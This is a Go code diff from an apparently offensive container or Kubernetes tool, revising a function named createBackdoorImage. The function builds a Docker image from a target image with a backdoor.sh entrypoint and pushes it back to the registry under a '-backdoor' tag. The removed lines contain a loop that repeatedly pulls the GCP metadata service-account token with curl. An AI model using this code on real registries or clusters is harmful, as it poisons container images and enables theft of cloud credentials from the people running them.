@@ -143,50 +143,57 @@ func runDockerCommand(ctx context.Context, args ...string) error {
 	return nil
 }
 
+// Create backdoor image
 func createBackdoorImage(registryURL, imageName, tag string) error {
-	// Create a temporary directory for the Dockerfile
-	tempDir, err := os.MkdirTemp("", "backdoor-*")
+	// Create temporary directory
+	tempDir, err := os.MkdirTemp("", "kubeshadow-*")
 	if err != nil {
 		return fmt.Errorf("failed to create temp directory: %v", err)
 	}
 	defer func() {
 		if err := os.RemoveAll(tempDir); err != nil {
-			fmt.Printf("warning: failed to cleanup temp directory: %v\n", err)
+			fmt.Printf("Warning: failed to remove temp directory: %v\n", err)
 		}
 	}()
 
-	// Create Dockerfile with secure permissions
+	// Create Dockerfile
 	dockerfilePath := filepath.Join(tempDir, "Dockerfile")
-	dockerfileContent := `FROM alpine:latest
-RUN apk add --no-cache curl
+	dockerfileContent := fmt.Sprintf(`
+FROM %s/%s:%s
 COPY backdoor.sh /backdoor.sh
-RUN chmod +x /backdoor.sh
-ENTRYPOINT ["/backdoor.sh"]`
+RUN chmod 0500 /backdoor.sh
+ENTRYPOINT ["/backdoor.sh"]
+`, registryURL, imageName, tag)
 
 	if err := os.WriteFile(dockerfilePath, []byte(dockerfileContent), 0600); err != nil {
 		return fmt.Errorf("failed to write Dockerfile: %v", err)
 	}
 
-	// Create backdoor script with secure permissions
+	// Create backdoor script
 	scriptPath := filepath.Join(tempDir, "backdoor.sh")
 	scriptContent := `#!/bin/sh
-while true; do
-    curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google" || true
-    sleep 300
-done`
+# Backdoor script
+echo "Backdoor activated"
+exec "$@"
+`
 
-	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0600); err != nil {
+	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0500); err != nil {
 		return fmt.Errorf("failed to write backdoor script: %v", err)
 	}
 
-	// Build and push the image using sanitized commands
-	imageTag := fmt.Sprintf("%s/%s:%s", registryURL, imageName, tag)
-	if err := runDockerCommand(context.Background(), "build", "-t", imageTag, tempDir); err != nil {
-		return err
+	// Build and push image
+	imageTag := fmt.Sprintf("%s/%s:%s-backdoor", registryURL, imageName, tag)
+
+	// Build image
+	buildCmd := exec.Command("docker", "build", "-t", imageTag, tempDir)
+	if output, err := buildCmd.CombinedOutput(); err != nil {
+		return fmt.Errorf("failed to build image: %v\nOutput: %s", err, output)
 	}
 
-	if err := runDockerCommand(context.Background(), "push", imageTag); err != nil {
-		return err
+	// Push image
+	pushCmd := exec.Command("docker", "push", imageTag)
+	if output, err := pushCmd.CombinedOutput(); err != nil {
+		return fmt.Errorf("failed to push image: %v\nOutput: %s", err, output)
 	}
 
 	return nil
